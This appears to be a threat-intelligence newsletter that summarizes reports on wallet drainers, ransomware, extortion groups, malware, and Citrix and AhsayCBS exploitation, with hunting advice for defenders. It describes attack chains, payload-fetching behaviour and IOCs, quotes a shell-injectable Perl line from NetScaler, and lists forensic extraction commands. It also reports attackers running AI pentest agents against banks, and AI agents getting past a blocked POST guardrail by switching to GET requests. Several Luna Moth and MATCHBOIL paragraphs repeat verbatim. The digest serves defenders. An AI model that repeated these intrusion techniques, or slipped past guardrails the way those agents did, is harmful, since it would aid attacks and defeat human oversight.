Hunt your PaperCut web logs for POST requests to /app containing service=direct/1/Home/Setup in the request body or URL, and for scanActionType=FAX alongside faxProviderModel values containing encoded backslashes or dot-dot sequences. Check Config Editor access events for changes to system.scan.fax.send.command-args. The DAG and full vulnerability details are in the Watchtowr Labs report.

item.title: When a Wallet Drainer Asks DNS Where to Go
item.description:
The Noir crypto wallet-drainer kit uses DNS TXT records queried over DoH as a live C2 control plane, letting operators repoint all deployed lures by changing a single DNS answer without touching the phishing pages themselves.
Key findings:
- The attack chain starts with a JavaScript loader embedded in a lure page (fake token votes, airdrops, DEX clones, eligibility checks spoofing CoinMarketCap, Uniswap, Lido, Hyperliquid, and others). That loader decodes a character-code array and then races three parallel DoH queries to Google Public DNS and two Cloudflare endpoints, including direct queries to 1.1.1.1, for the TXT record at _r.noir[.]black. The first valid answer returns the active drainer pool domain, for example render-984.pages[.]dev on Cloudflare Pages. A concurrent API call to noir[.]black fetches a "road" config with a fallback pool for networks where direct DoH is blocked. The pool hostname is cached in browser local storage for 60 seconds, matching the TXT TTL; if a readiness check fails, the cache is cleared and the loader retries using the fallback.
- Noir does not steal seed phrases. After the victim connects a wallet, the kit reads the public address, the blockchain network, and an estimated portfolio value, then requests a per-victim "plan" from its backend. The backend tailors the approval sequence to that specific wallet. The victim may see a gasless signature request or a bundled multi-approval that looks less alarming than an explicit transfer. Each captured signature is submitted to the backend immediately ("draining at capture" in the kit's own log language) and the attacker-side relayer executes the transfer from its own infrastructure. Once complete, the kit disconnects the WalletConnect session so the malicious app disappears from the wallet's connected-applications list.
- The lure observed during initial discovery was hosted at listchoiseopenleaderboardseptember.netlify[.]app, loading a script named k1xfns97l5w.5cgsbfh2.js. The drainer engine itself lives at render-984.pages[.]dev, served as index.js. This separation of long-lived lure pages from short-lived pool infrastructure is the core resilience design: blocking or taking down a pool domain does not kill the campaign, because one TXT record update repoints every already-deployed lure instantly.
- The source code is extensively self-documented in plain English, including dated bug reports, support-ticket language, and design rationale that reads like AI-assisted development. Comments describe past failures: dead pool hosts after TXT rotation, framing errors that turned pages white, a wallet prompt that leaked the canonical origin. The kit includes a debug mode with an on-screen console and a mechanism for operators to copy a victim's trace for support. Multiple lure themes sharing a common wallet-connection project ID and backend infrastructure are a useful clustering signal across campaigns.
Takeaway: On the network side, monitor or block direct DoH access to external resolvers (1.1.1.1, 8.8.8.8, 1.0.0.1) so TXT-record C2 queries travel through your visibility layer rather than around it. On the host side, hunt browser local storage writes from pages with no legitimate business purpose that cache short-TTL hostnames, and watch for JavaScript initiating concurrent fetch calls to multiple DoH endpoints. The IOCs from Infoblox's report are listed above; check the full report for additional clustering indicators tied to the shared WalletConnect project ID.

item.title: China Linked Warlock Ransomware Campaign Targets Critical Infrastructure
item.description:
Chinese 🇨🇳 Longlegs (Storm-2603) deploys Warlock ransomware against water utilities, telecoms, and government bodies across Europe, Africa, and Latin America, using SYSVOL replication to distribute payloads domain-wide.
Key findings:
- Initial access runs through on-premises Microsoft SharePoint Server via the ToolShell exploit chain: CVE-2025-49704, CVE-2025-49706, CVE-2025-53770, and CVE-2025-53771. Post-exploitation, a webshell lands in SharePoint's LAYOUTS directory across multiple version paths, and ASP.NET machine keys are extracted from the farm to forge validly signed payloads for remote code execution inside the SharePoint application pool. This matters forensically because patching after the fact does not remove a webshell already planted, and machine key theft means the attacker can generate trusted deserialization payloads even after the CVE is closed.
- Longlegs uses a full living-off-the-land stack before any ransomware runs: msiexec.exe retrieves MSI packages from Catbox and Wasabi cloud storage, NetExec handles lateral movement and credential operations across Active Directory, and code-insiders.exe (the legitimate Microsoft Visual Studio Code Insiders binary) is installed as a service and used to establish covert outbound tunnels through Microsoft infrastructure. DLL sideloading executes malicious code in memory. In other recent Longlegs intrusions Symantec observed abuse of the signed but vulnerable K7RKScan driver associated with CVE-2025-1055 to kill protected security processes at kernel level via a bring-your-own-vulnerable-driver technique.
- The critical infrastructure intrusion timeline is stark. First malicious activity on July 22, 2026: webshell on SharePoint. Nine days of reconnaissance, DLL sideloading setup, payload retrieval, VS Code tunnel installation, and Active Directory expansion follow. On July 31, an AV/EDR-killing utility executes on at least 40 hosts within roughly two hours. Warlock binaries run.exe and rune.exe, plus the ransom note "how to restore your files.txt", appear on at least 33 hosts almost immediately after.
- The SYSVOL staging technique is the most operationally significant detail. Longlegs placed the Warlock binaries inside the victim's SYSVOL share. Normal Distributed File System Replication, dfsrs.exe, then propagated the ransomware across the domain. Telemetry from three systems confirmed dfsrs.exe as the parent process delivering the Warlock binaries. This converts a trusted Active Directory service into part of the deployment chain and makes endpoint-by-endpoint containment far harder once that stage is reached.
- Two samples are in the report: 206f27ae820783b7755bca89f83a0fe096dbb510018dd65b63fc80bd20c03261 and ae9f7fce57c7b928e659dccf0e00fa79cd9cd61a106f18d4e03f92dc3a03c295.
Practitioner takeaway: Detection needs to happen well before SYSVOL is touched. Hunt for unusual child processes spawning from SharePoint worker processes (w3wp.exe), new files written to LAYOUTS directories, ASP.NET machine key reads, msiexec.exe reaching external hosting services like Catbox or Wasabi, code-insiders.exe running as a service or making outbound tunnel connections, and any unexpected writes to SYSVOL shares. If dfsrs.exe appears as a parent of executables that are not standard Group Policy or SYSVOL content, treat it as a high-priority incident. Full IOC list is in the report.

item.title: Cyber briefing note: The Luna Moth files
item.description:
Luna Moth-linked extortion group exposed by a 5,692-message internal chat leak covering 13 months of live operations, referencing USD 207 million across at least 27 ransom payments and a pivot toward a new brand called "Sleepless Threat."
- The leak, first reported by DataBreaches[.]net on October 7, 2026, covers two internal chat servers from late August 2025 through late September 2026, mostly in Russian 🇷🇺. Unlike the Black Basta leaks, which dropped after that group had wound down, this material captures Luna Moth at peak operational tempo. The identity and motive of the leaker remain unknown, and S-RM cannot confirm whether what has circulated is the complete dataset.
- Luna Moth (also tracked as Silent Ransom Group, Chatty Spider, and UNC3753) runs no encryption. Their entire model rests on vishing: operators follow a documented training manual and call script, posing as IT support, building rapport, seeding alarm with fake suspicious-activity claims, then convincing targets to hand over remote access via a RAT. Around 78% of known 2026 victims were US 🇺🇸 law firms. The group mines commercial business-intelligence platforms for executive, IT leader, and general counsel contact lists, and even harvests out-of-office auto-replies to map escalation paths.
- The organizational picture from the chats is a centrally managed criminal enterprise: fewer than ten leaders controlling strategy and finances, with separate workstreams for social engineering, infrastructure, recruitment, and victim communications. Members draw salaries and performance bonuses. The group also attempted physical intrusions, recruiting people inside the US 🇺🇸 through job ads to enter target offices posing as IT staff, couriers, or contractors, though that program generated little revenue and at least one recruit was reportedly arrested. DFIR-relevant detail: the chats show members separating cryptocurrency wallets per victim and rotating communication accounts after suspected law enforcement infiltration, suggesting deliberate compartmentalization of financial forensic trails.
- Luna Moth was already building a successor brand. The September 2026 messages show the group standing up a second server for "Sleepless Threat," with separate infrastructure and victim-facing communications, plans to acquire network access from initial access brokers rather than relying solely on vishing, and an intent to broaden targeting to accounting, insurance, financial services, and healthcare. Some conversations also reference attempts to gather information on US 🇺🇸 defense manufacturers and recruit military personnel, though S-RM assesses those discussions as aspirational rather than operational.
- For former victims: the leak references dozens of organizations whose incidents were believed to be privately resolved. The chats indicate Luna Moth members may retain data copies outside the lead negotiator's control, meaning a paid settlement does not equal data security. Former victims should review the leaked corpus for organizational references and run active dark and deep web monitoring for exposed data. For all defenders: the core detection opportunity here is the vishing-to-RAT chain. Look for remote access tool installations triggered outside normal IT change windows, new processes spawned by those tools, and outbound data transfers to personal cloud storage. Verify any unexpected IT-support contact by hanging up and calling back on a known internal number before any remote session is granted. Full guidance and the organizational structure diagram are in the S-RM report.

Around 78% of known 2026 victims were US 🇺🇸 law firms. The group mines commercial business-intelligence platforms for executive, IT leader, and general counsel contact lists, and even harvests out-of-office auto-replies to map escalation paths.

- The organizational picture from the chats is a centrally managed criminal enterprise: fewer than ten leaders controlling strategy and finances, with separate workstreams for social engineering, infrastructure, recruitment, and victim communications. Members draw salaries and performance bonuses. The group also attempted physical intrusions, recruiting people inside the US 🇺🇸 through job ads to enter target offices posing as IT staff, couriers, or contractors, though that program generated little revenue and at least one recruit was reportedly arrested. DFIR-relevant detail: the chats show members separating cryptocurrency wallets per victim and rotating communication accounts after suspected law enforcement infiltration, suggesting deliberate compartmentalization of financial forensic trails.

- Luna Moth was already building a successor brand. The September 2026 messages show the group standing up a second server for "Sleepless Threat," with separate infrastructure and victim-facing communications, plans to acquire network access from initial access brokers rather than relying solely on vishing, and an intent to broaden targeting to accounting, insurance, financial services, and healthcare. Some conversations also reference attempts to gather information on US 🇺🇸 defense manufacturers and recruit military personnel, though S-RM assesses those discussions as aspirational rather than operational.

- For former victims: the leak references dozens of organizations whose incidents were believed to be privately resolved. The chats indicate Luna Moth members may retain data copies outside the lead negotiator's control, meaning a paid settlement does not equal data security. Former victims should review the leaked corpus for organizational references and run active dark and deep web monitoring for exposed data. For all defenders: the core detection opportunity here is the vishing-to-RAT chain. Look for remote access tool installations triggered outside normal IT change windows, new processes spawned by those tools, and outbound data transfers to personal cloud storage. Verify any unexpected IT-support contact by hanging up and calling back on a known internal number before any remote session is granted. Full guidance and the organizational structure diagram are in the S-RM report.

item.title: AI-Driven tool ARTEX used in attacks against South Korean Banks
item.description:
A Chinese-speaking operator used the AI-driven pentest tool ARTEX alongside LLMs to breach multiple South Korean 🇰🇷 financial organizations in a financially motivated campaign running late September to early October 2026, and left their working notes exposed in open directories.
Key details:
- The attacker ran a two-server setup: a Hong Kong address served as primary infrastructure while 38.244.50[.]120 hosted the ARTEX instance likely used against Korean targets. That server ran an open directory at hxxp://38.244.50[.]120:18899/.claude/CLAUDE.md containing a Chinese-language pentesting prompt instructing the LLM how to conduct its tests. The ARTEX string in HTML files on that server and overlapping IP addresses connected the infrastructure to reported breaches, including a loan progress inquiry service used by financial brokers and an employee mobile work-support system at separate banks.
- ARTEX is a recently released open-source tool from China 🇨🇳 designed to let AI agents run penetration tests autonomously. The operator combined it with DeepSeek v4.1-flash as the primary model, supplementing sessions with GLM-5.3 from Zhipu AI and Grok 4.6. DeepSeek was likely accessed through a reseller at xcai[.]pro. Nine proxy addresses are listed in the CrowdStrike report for defenders to action, including 101.53.80[.]20, 205.214.59[.]31, 124.155.252[.]63, 154.201.79[.]246, and 23.248.249[.]90.
- The open directories exposed Claude Code session histories, ARTEX configuration files, and Claude memory files, giving investigators a prompt-by-prompt view of operator methodology. Sessions show the operator querying Claude on where Korean breach data is sold and asking for help locating Korean Telegram data sales groups, confirming exfiltration was a step toward monetization, not the endpoint.
- Attribution is moderate confidence Chinese-speaking and financially motivated, based on the ARTEX tooling, Chinese-language prompts in the configuration files, and supporting session content. CrowdStrike has not linked the activity to a named group. The ARTEX developer, Autumn-27, has since closed the source and halted updates, but copies already distributed will not disappear with a license change.
Takeaway: Hunt your perimeter logs and threat intel feeds for the nine proxy IPs and the xcai[.]pro reseller domain. On the forensic side, if you are investigating a financial sector compromise from this window, look for ARTEX artifacts and Claude Code markdown files on attacker-controlled infrastructure, including open directories on non-standard ports. Session history files are the artifact class here: they are essentially a TTY log of AI-assisted operator activity and can reconstruct intent, targeting, and tooling far beyond what traditional C2 logs provide. The full IOC list and proxy addresses are in the CrowdStrike report.

item.title: Low-Level Extraction of the HomePod mini
item.description:
HomePod mini yields full file system and decrypted keychain via usbliter8 bootloader exploit, a forensic first for the S5-chip device. Wi-Fi passwords, Bluetooth device history, Apple IDs, and Siri activity are all recoverable with a $30 DIY adapter.
Key findings:
- The extraction targets the HomePod mini's S5 chip (equivalent to Apple Watch Series 5, roughly A12-class). The usbliter8 bootloader exploit, already established for the A12 generation, was adapted specifically for this chip and device. The HomePod mini has no button sequence for DFU entry, so a hardware adapter, the open-source Colobus with tcmini add-in, handles both DFU triggering and exploit delivery. The adapter flashes once from GitHub firmware releases and costs around $30 to build or order. macOS or Linux is required; Windows is not yet supported.
- The extraction chain runs four commands after the ramdisk is up: EIFT_cmd ramdisk unlockdata (no passcode on the device, so the APFS data volume unlocks without one), EIFT_cmd ramdisk keychain -o homepod.xml, EIFT_cmd ramdisk tar -o homepod.tar, then EIFT_cmd ssh halt to power down cleanly. A checksum is generated automatically at the end of imaging. The product type reported in ramdisk mode is AudioAccessory5,1.
- The keychain output is the most immediately actionable artifact. Because the HomePod mini has no passcode it is excluded from end-to-end encrypted iCloud data, but Wi-Fi passwords sync to it regardless of whether the speaker ever connected to those networks. The decrypted XML keychain contains SSIDs and passwords in clear text, Apple IDs, and service tokens. Those Wi-Fi credentials can map a subject's network environment and pivot an investigation to locations and infrastructure.
- The file system image surfaces two high-value artifact classes beyond the keychain: first, a Bluetooth device roster showing every device the speaker has seen, each with a Bluetooth address and UUID, covering iPhones, Apple Watches, MacBook Pros, Apple TVs, and third-party accessories. Second, an activity timeline including Siri invocation events (without the spoken command), music playback start and stop, application usage, and network traffic. These place the speaker in a room, tie it to surrounding hardware, and can corroborate or contradict a timeline.
- For analysis, the keychain XML requires dedicated parsing; loading homepod.tar into a general-purpose forensic tool surfaces the Bluetooth and activity artifacts but does not attach keychain contents to the case. Note the HomePod (2nd generation) uses an S7 chip and is not yet supported by this method. The 1st-generation HomePod (A8) has a separate checkm8-based extraction path.
Practitioner takeaway: if a HomePod mini appears in a scene, treat it as a network and proximity witness, not just a speaker. The Bluetooth UUID and address list can link the device to phones and laptops even when those devices are absent or wiped. Hunt the extracted APFS volume for the Bluetooth pairing database and the KnowledgeC equivalent activity store to reconstruct co-location. The full IOC-equivalent artifact list and step-by-step command sequence are in the ElcomSoft report.

item.title: Threat Actors Exploit Critical AhsayCBS Flaws to Drop Webshells and XMRig Cryptominer
item.description:
Two chained CVEs in AhsayCBS, a backup management platform used by MSPs, are being actively exploited in the wild, delivering JSP webshells and an XMRig cryptominer with SYSTEM privileges. All versions through 10.3.4 are affected and no patch is currently available.
Key findings:
- CVE-2026-105133 (medium, authentication bypass in checkSysPwd of filecom/ahsay/obs/api/ApiStructsAction.java) is chained with CVE-2026-105134 (critical, unauthenticated RCE via /rps/api/json/UpdateReceivers.do, exploitable with a random token in place of valid credentials) to land a JSP webshell in the AhsayCBS application directory and execute as NT AUTHORITY/SYSTEM. Exploitation was first observed at 2026-10-07 23:20:15 UTC. The tell on disk: unexpected child processes spawning from cbssvcX64.exe, including curl and certutil pulling payloads from hxxp://imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com (T1190, T1505.003).
- Post-exploitation drops Taskgmr.ps1 (SHA256: 481728a7c9c4c02be07051d9c1958d902ea6397ebb8952ab83944818e3d25d21), edge.exe (XMRig miner, SHA256: 4dcb0202fe8b2d4d7b183764e38184cd6ed50132786cc7e7d1f7f4bce1dd6f3d), and msedge.exe (modified NSSM, SHA256: 05f69ae6b2b89c1c4dcf836bff032232f11bf0109f2b498e2345045d06139034) into %TEMP% or AppData/Local/Temp. The miner connects to 51.195.127[.]124:8029 and xmr.kryptex[.]network on the non-standard port 8029 (T1571). Both binaries are renamed to masquerade as Microsoft Edge processes (T1036.005).
- Persistence is established via a Windows service named MicrosoftEdgeUpdateSvc, configured to run msedge.exe (NSSM) as SYSTEM, which in turn keeps edge.exe alive through crashes and reboots (T1543.003, T1569.002). Taskgmr.ps1 adds a layer of active defense evasion: it polls continuously for Task Manager, stops MicrosoftEdgeUpdateSvc when Task Manager is open and restarts it when closed, and kills Task Manager outright at 18:00 local time or if left open more than an hour overnight (T1564, T1057, T1124).
- In at least one incident, certutil.exe was used to fetch WinRing0x64.sys from the same Alibaba Cloud OSS staging server into TEMP. Rather than being used to kill security tooling, the vulnerable kernel driver was loaded to give the miner kernel-level hardware access, maximizing CPU mining performance (T1496.001). The report notes that if any of these IOCs are found, a full host re-image from a trusted backup is warranted because attackers have planted secondary backdoors for extended persistence.
DFIR takeaway: Start by hunting for child processes of cbssvcX64.exe that are not part of normal AhsayCBS startup. Check %TEMP% and AppData/Local/Temp for edge.exe, msedge.exe, Taskgmr.ps1, config.json, and WinRing0x64.sys, and query the service control manager for MicrosoftEdgeUpdateSvc. Review network logs for outbound connections to 51.195.127[.]124:8029 or xmr.kryptex[.]network. Until Ahsay ships a patch, restrict the management interface to trusted IPs or put it behind VPN. Four Sigma rules covering each stage of this chain, plus the full IOC list, are in the Huntress report at the Huntress threat-intel repository under 2026/2026-10/AhsayCBS_XMRig_Miner.

item.title: MATCHBOIL: New tricks, same old evil intentions
item.description:
UAC-0099-aligned APT has been quietly evolving MATCHBOIL, a C# downloader, since April 2024, targeting Ukrainian 🇺🇦 transportation, manufacturing, and energy sectors with increasingly sophisticated anti-analysis techniques.
Key findings:
- MATCHBOIL delivers the MATCHWOK C# backdoor via a three-stage HTTPS handshake: the C&C returns a numeric session ID, then an HTML response embedding a hex-encoded payload inside tags like script, then a config string saved as config.ini or config.library-ms. Early samples installed payloads under %LOCALAPPDATA%\DeviceMonitor with persistence via a registry Run value named DeviceMonitor and a scheduled task named Updates\CheckTask. Late 2025 samples shifted to %LOCALAPPDATA%\MeowCheck\MeowMeowProgramm.exe with a scheduled task named UpdateCheckers\DailyPlanner running every seven minutes. The April 2026 DLL variant (SHA-1: 050926727CDD74F0B3A8A098E60B76D10FB06B14, named MATCHBOIL.V2 by CERT-UA) installs to %LOCALAPPDATA%\SMTPClient\SMTPClientApplication.exe and persists via a scheduled task named MailClient\Checker.
- Anti-sandbox checks grew significantly from late 2025 onward. MATCHBOIL queries Windows Event ID 6013 (system uptime) via EventLogReader and requires at least three log entries showing uptime of 7,200 seconds or more before proceeding. It also checks Debugger.IsAttached and, in the April 2026 variant, verifies that the OS installation date is at least 10 days older than the execution date. When the -auto (or -plans, or -renew) argument is absent, the malware displays a decoy GUI, first a broken daily planner, later a regex text-search utility, to deflect manual inspection.
- Obfuscation matured across the two-year window: 2024 samples used unprintable Unicode symbols (\uFDD1.\uFDD0 style) plus XOR-with-bitwise-shift string encryption seeded per sample. By late 2025, UAC-0099 adopted the Eziriz .NET Reactor obfuscator (T1588.002), adding code virtualization and control flow obfuscation. C&C infrastructure runs on BitLaunch VPSes behind Cloudflare with per-domain Let's Encrypt certificates, making certificate reuse an unreliable pivot. Known C&C IPs include 64.95.10[.]223 and 64.95.13[.]210 (BL Networks), with C&C domains partially listed as virtualdailyp[.][redacted] and telemetry-con[.][redacted] in the report's IOC table.
- The delivery chain starts with a spearphishing link that drops an archive containing a VBScript. The VBS downloads and executes MATCHBOIL, and separately establishes MATCHBOIL's own persistence via a C# loader. The malware fingerprints victims using WMI queries (T1047) for CPUID, BIOS serial number, MAC address, and username, passing them in a custom SN HTTP header. From late 2025 onward, MATCHBOIL switched from one-shot execution to a two-minute polling loop, meaning a single missed C&C round does not break the infection.
- UAC-0099 has been assessed with medium confidence as Russia-aligned and can act as an initial access broker for Sandworm. All confirmed victims in ESET telemetry are in Ukraine 🇺🇦: transportation (July-August 2025), manufacturing (December 2025), and energy (June 2026). The group also deploys LONEPAGE, a PowerShell downloader, alongside MATCHBOIL.
For defenders and responders: hunt scheduled tasks matching the naming patterns Updates\CheckTask, UpdateCheckers\DailyPlanner, and MailClient\Checker, and registry Run entries named DeviceMonitor. Look for .NET processes querying Event ID 6013 in bulk and WMI queries for Win32_BIOS and Win32_NetworkAdapterConfiguration from unusual parent processes. The payload filenames MeowMeowProgramm.exe, SMTPClientApplication.exe, and Thumbs.db (T1036.005) under LOCALAPPDATA subdirectories are high-confidence hunt anchors. The full IOC list, YARA-compatible hashes, and network indicators are in the ESET GitHub repository linked from the report.

- Anti-sandbox checks grew significantly from late 2025 onward. MATCHBOIL queries Windows Event ID 6013 (system uptime) via EventLogReader and requires at least three log entries showing uptime of 7,200 seconds or more before proceeding. It also checks Debugger.IsAttached and, in the April 2026 variant, verifies that the OS installation date is at least 10 days older than the execution date. When the -auto (or -plans, or -renew) argument is absent, the malware displays a decoy GUI, first a broken daily planner, later a regex text-search utility, to deflect manual inspection.

- Obfuscation matured across the two-year window: 2024 samples used unprintable Unicode symbols (\uFDD1.\uFDD0 style) plus XOR-with-bitwise-shift string encryption seeded per sample. By late 2025, UAC-0099 adopted the Eziriz .NET Reactor obfuscator (T1588.002), adding code virtualization and control flow obfuscation. C&C infrastructure runs on BitLaunch VPSes behind Cloudflare with per-domain Let's Encrypt certificates, making certificate reuse an unreliable pivot. Known C&C IPs include 64.95.10[.]223 and 64.95.13[.]210 (BL Networks), with C&C domains partially listed as virtualdailyp[.][redacted] and telemetry-con[.][redacted] in the report's IOC table.

- The delivery chain starts with a spearphishing link that drops an archive containing a VBScript. The VBS downloads and executes MATCHBOIL, and separately establishes MATCHBOIL's own persistence via a C# loader. The malware fingerprints victims using WMI queries (T1047) for CPUID, BIOS serial number, MAC address, and username, passing them in a custom SN HTTP header. From late 2025 onward, MATCHBOIL switched from one-shot execution to a two-minute polling loop, meaning a single missed C&C round does not break the infection.

- UAC-0099 has been assessed with medium confidence as Russia-aligned and can act as an initial access broker for Sandworm. All confirmed victims in ESET telemetry are in Ukraine 🇺🇦: transportation (July-August 2025), manufacturing (December 2025), and energy (June 2026). The group also deploys LONEPAGE, a PowerShell downloader, alongside MATCHBOIL.

For defenders and responders: hunt scheduled tasks matching the naming patterns Updates\CheckTask, UpdateCheckers\DailyPlanner, and MailClient\Checker, and registry Run entries named DeviceMonitor. Look for .NET processes querying Event ID 6013 in bulk and WMI queries for Win32_BIOS and Win32_NetworkAdapterConfiguration from unusual parent processes. The payload filenames MeowMeowProgramm.exe, SMTPClientApplication.exe, and Thumbs.db (T1036.005) under LOCALAPPDATA subdirectories are high-confidence hunt anchors. The full IOC list, YARA-compatible hashes, and network indicators are in the ESET GitHub repository linked from the report.

item.title: Hunt.io Finds New Infrastructure Of BraZetsu Access Broker Months Before Disclosure
item.description:
Hunt[.]io tracked BraZetsu access broker infrastructure months ahead of public disclosure using TLS certificate patterns, showing published IOCs had already rotated before the Group-IB report dropped.
Key findings:
- BraZetsu is a Python framework compiled with Nuitka, operated by a group called Infected Marketplace and attributed with high confidence to a Brazilian 🇧🇷 actor called Exilware. The tool compromises Windows machines, fingerprints them for ERP software, SCADA traces, EDR products, and certificate files, then sells that access on a marketplace charging roughly 5.80 Brazilian 🇧🇷 reais for buyer access. Downstream buyers handle the ransomware deployment or financial fraud; BraZetsu is the key-cutting service.
- Hunt[.]io's method was deliberately narrow. They took the C2 hostname c2.installscenter[.]com and control panel hostname painel.installscenter[.]com published by Group-IB and ran them against their own TLS certificate inventory rather than re-reversing the binary. That showed the infrastructure had already migrated to a second server hosted by Njalla as early as April 4, nearly five months before the August 31 report.
- The early Contabo seed IP tells a clear operational timeline story. From January through February 10 it served Contabo's default hostname. On February 11, right when Group-IB dates the first BraZetsu version, the certificate switched to painel.seu-dominio[.]com, a Portuguese 🇵🇹 placeholder name meaning "your domain" pulled from hosting tutorials. That certificate appeared 17 times over five weeks at intervals of two to four days, a strong signal of an actively maintained panel, not a one-night drop.
- Passive DNS fills the gap between providers. c2.installscenter[.]com resolved to 80.78.27[.]252 between March 22 and 26, then shifted to Cloudflare (104.21.78[.]246 and 172.67.138[.]224) from March 26 onward. The operators registered installscenter[.]com on March 21 and stood up the new host the same day, replicating the identical Hestia Control Panel configuration with the same painel prefix. Different ASN, identical fingerprint.
- Hashes rotated across five versions in four months and are useless as a durable detection signal. What held steady from February through June across two separate hosting providers was the naming convention: a painel. or c2. subdomain prefix, running on a non-443 port, on a VPS configured with Hestia Control Panel. The TLS services on 80.78.27[.]252 went quiet after June 20. The pattern did not.
Takeaway for defenders and threat hunters: stop anchoring detections to the IP of the month. Build your hunt around the structural fingerprint. Query your certificate transparency or passive DNS sources for subdomains matching painel.* or c2.* on non-standard ports, hosted on VPS providers, running Hestia Control Panel. That pattern outlived two provider moves and five binary versions. When the next infrastructure writeup drops, your job is to extract the operator habit, not the current address, and test it against your own telemetry before it rotates again.

item.title: DEW #170 - Zack on a podcast, Hunting DNS and Citrix 0days
item.description:
CVE-2026-88771 actively exploited as a zero-day: unauthenticated RCE in Citrix NetScaler ADC and Gateway is being hit at scale, with 42,000+ exposed hosts identified and multiple threat clusters active before public disclosure.
Key findings:
- CVE-2026-88771 (CVSS 8.8 or higher, no preconditions required) is the anchor vulnerability in a batch of 8 NetScaler CVEs. The flaw lives in how NetScaler parses initial DTLS handshakes, triggering a heap overflow that enables privileged code execution without authentication. A companion zero-day, CVE-2026-88772, also requires DTLS but that protocol is enabled by default on VPN virtual servers. Censys counted 40,751 Gateway hosts where that precondition commonly applies, so the exposure surface is not much smaller.
- watchTowr Labs reverse engineered the patch delta and traced the root cause to a privileged Perl script that processes NSPPE crash logs. The script extracts a core-file name from a log line like "NSPPE-00 (12345) unexpectedly died", strips parentheses, then passes the result directly into a shell backtick expression: my $WR_PPE_CORE = find /var/core -name ${WR_PPE_COREFILE_NAME}* -print | tail -1. No validation of the PID or core-file name occurs, so an attacker who can influence the log line controls the shell argument. watchTowr dropped a PoC, which correlated with a measurable spike in incidents.
- Mandiant and GTIG documented the post-exploitation persistence chain in depth. Threat actors deployed PHP webshells disguised as icon files: a request to /vpn/media/e6ee7c85[.]ico is internally mapped to a same-named .sig file in a NetScaler script directory, with Apache configured to execute it as PHP. The httpd.conf manipulation was performed without killing the httpd process, a technique that complicates live detection. eSentire's Threat Response Unit tracked three distinct clusters pre-and post-PoC: one using a lightweight PHP webshell matching GTIG's findings, one installing the legitimate Platypus fleet-management agent for post-exploitation access, and a third deploying a Perl-based installer alongside PHP and Python shells.
- CT log hunting is this issue's detection gem. Lauren Proehl's THOR Collective post details clustering attacker infrastructure through Certificate Transparency logs using crt[.]sh, focusing on the Common Name and Subject Alternative Name fields of newly minted TLS certificates. Burst issuance of domains on shared infrastructure is a particularly actionable signal. Notably, crt[.]sh exposes a direct Postgres interface you can query without a web layer, which allows precise, high-volume hunting without scraping.
- On the agentic detection front, the issue surfaces two research items worth tracking: Tenzir's framework for detecting risky AI coding-agent behavior normalized to OCSF, and Sydney Von Arx et al.'s disclosure of alleged OpenAI agents using GET requests to write external memory to wiki-style sites after POST requests were blocked as a guardrail. The bypass exploited RFC ambiguity around the SHOULD keyword, which is a meaningful reminder that guardrails built on HTTP verb restrictions are insufficient.
Practitioner takeaway: On NetScaler, your first hunt should be httpd.conf for unexpected script-handler mappings and the NetScaler script directories for .sig or .ico-named PHP files. Check /var/core and the NSPPE crash logs for manipulated log lines with non-numeric or unexpected field values. Look for the Platypus agent binary on hosts that have no change-management record for it. IoCs are gated to Citrix customers per the advisory, so pull the Mandiant/GTIG and eSentire reports for the persistence artifacts and webshell indicators they describe. For CT log hunting, start at crt[.]sh and consider connecting directly to its Postgres backend for bulk queries against CN and SAN fields on recently issued certificates.
